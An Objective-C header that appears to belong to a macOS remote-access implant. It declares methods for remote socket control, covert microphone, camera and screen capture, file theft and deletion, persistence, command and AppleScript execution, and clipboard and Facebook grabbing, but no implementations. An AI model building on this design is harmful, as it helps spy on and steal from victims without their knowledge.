
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#include <arpa/inet.h>
#import <Appkit/Appkit.h>
#import "escryptor.h"

@interface espl : NSObject {
    NSFileManager *fileManager;
}

@property (nonatomic,strong) AVCaptureSession *session;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (retain) AVAudioRecorder *soundRecorder;
@property (retain) NSFileManager *fileManager;
@property (retain) NSString *skey;
@property (retain) NSString *terminator;
@property (nonatomic,strong) NSTask *systask;

//convenience
-(void)blank;

//socks
extern int sockfd;

-(int)connect:(NSString*)host :(long)port;
-(void)sendString:(NSString *)string;
-(void)livesendString:(NSString *)string;

//mic
-(void)mic:(NSString *)arg;
-(void)initmic;
-(BOOL)stopAudio;
-(BOOL)recordAudio;

//camera
-(NSData*)takePicture;
-(void)initcamera;
-(void)captureWithBlock:(void(^)(NSData* block))block;
-(void)stopcapture;
-(AVCaptureDevice *)getcapturedevice;

//file management
-(void)directoryList:(NSString *)arg;
-(NSData*)filePathToData:(NSString *)arg;
-(void)rmFile:(NSString *)arg;
-(void)changeWD:(NSString *)arg;
-(void)receiveFile:(NSString *)saveToPath;
-(void)receiveFileData:(NSString *)saveToPath :(long)fileSize;
-(void)sendFileData:(NSData*)fileData;

//misc
-(void)idleTime;
-(void)getPid;
-(void)getFacebook;
-(void)getPaste;
-(void)set_brightness:(NSString *)arg;
-(NSData *)screenshot;
-(void)persistence:(NSString *)ip :(int)port;
-(void)removePersistence:(NSString *)ip :(int)port;
-(void)openURL:(NSString *)arg;
-(void)runtask:(NSString *)cmd;
-(void)runAppleScript:(NSString *)arg;
-(void)receivedData:(NSNotification *)notif;
-(NSData *)GetMACAddress;
-(NSString *)GetMACAddressDisplayString;

@end
